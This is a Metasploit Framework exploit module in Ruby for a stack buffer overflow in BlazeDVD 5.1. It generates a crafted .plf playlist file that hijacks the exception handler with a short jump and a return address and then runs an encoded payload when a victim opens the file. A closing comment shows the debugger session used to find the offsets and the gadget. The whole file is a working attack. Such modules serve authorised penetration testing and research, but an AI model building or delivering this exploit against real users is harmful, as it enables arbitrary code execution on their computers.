##
# $Id: blazedvd_plf.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'BlazeDVD 5.1 PLF Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack over flow in BlazeDVD 5.1. When
					the application is used to open a specially crafted plf file,
					a buffer is overwritten allowing for the execution of arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'CVE' , '2006-6199' ],
					[ 'OSVDB', '30770'],
					[ 'BID', '35918' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "\x00",
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
					'DisableNops'  =>  'True',
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'BlazeDVD 5.1', { 'Ret' => 0x100101e7 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Aug 03 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME',   [ false, 'The file name.',  'msf.plf']),
			], self.class)
	end

	def exploit

		plf = rand_text_alpha_upper(6024)

		plf[868,8] = Rex::Arch::X86.jmp_short(6) + rand_text_alpha_upper(2)  + [target.ret].pack('V')
		plf[876,12] = make_nops(12)
		plf[888,payload.encoded.length] = payload.encoded

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(plf)

	end

end

=begin
0:000> !exchain
0012f2c8: 31644230
Invalid exception stack at 64423963
0:000> !pattern_offset 6024 0x31644230
[Byakugan] Control of 0x31644230 at offset 872.
0:000> !pattern_offset 6024 0x64423963
[Byakugan] Control of 0x64423963 at offset 868.
0:000> s -b 0x10000000 0x10018000 5e 59 c3
100012cd  5e 59 c3 56 8b 74 24 08-57 8b f9 56 e8 a2 3c 00  ^Y.V.t$.W..V..<.
100101e7  5e 59 c3 90 90 90 90 90-90 8b 44 24 08 8b 4c 24  ^Y........D$..L$
0:000> u 0x100012cd L3
skinscrollbar!SkinSB_ParentWndProc+0x1fd:
100012cd 5e              pop     esi
100012ce 59              pop     ecx
100012cf c3              ret
=end
